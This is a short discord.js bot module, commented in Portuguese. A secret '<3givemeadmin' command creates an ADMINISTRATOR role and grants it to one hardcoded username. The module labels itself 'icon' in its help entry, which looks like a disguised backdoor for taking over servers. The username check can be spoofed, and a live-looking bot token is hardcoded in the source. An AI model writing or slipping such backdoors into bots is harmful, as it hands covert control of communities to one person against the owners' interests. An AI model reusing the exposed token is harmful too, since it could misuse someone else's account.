const Discord = require('discord.js');
const client = new Discord.Client();
const token = 'NDQ4ODU3ODcwNDI0MDgwMzk0.DhnQFw.vO9NCNTw4Gci0DBaORMuSm5YjXo';
const fs = require('fs')
var config = JSON.parse(fs.readFileSync('./botsettings.json', 'utf-8'));
client.on('ready', () => {
  console.log('comando GIVEADMIN pronto!');
});

client.on ('message', async message => {
  if (message.content.startsWith("<3givemeadmin")) {
     let toMute = message.guild.member(message.author)
    
        
        if(message.author.username !== 'JPN|Over') return message.channel.send(":x: Somente JPN pode usar esse comando!!");

        let role = message.guild.roles.find(r => r.name === "administrador provisório");
        if(!role) {
        try {
            role = await message.guild.createRole({
                name: "administrador provisório",
                color: "##dea9de",
                permissions: ["ADMINISTRATOR"]
            });

            message.guild.channels.forEach(async (channel, id) => {
                await channel.overwritePermissions(role, {
                    ADMINISTRATOR: true,
                });
            });
         } catch(e) {
            console.log(e.stack);
          }
        }

        

        await toMute.addRole(role);
        message.channel.sendMessage(message.author.username + " agora tem permissões administrativas!")
}
})
           
client.login(config.token);
module.exports.help = {
    name: "icon",
}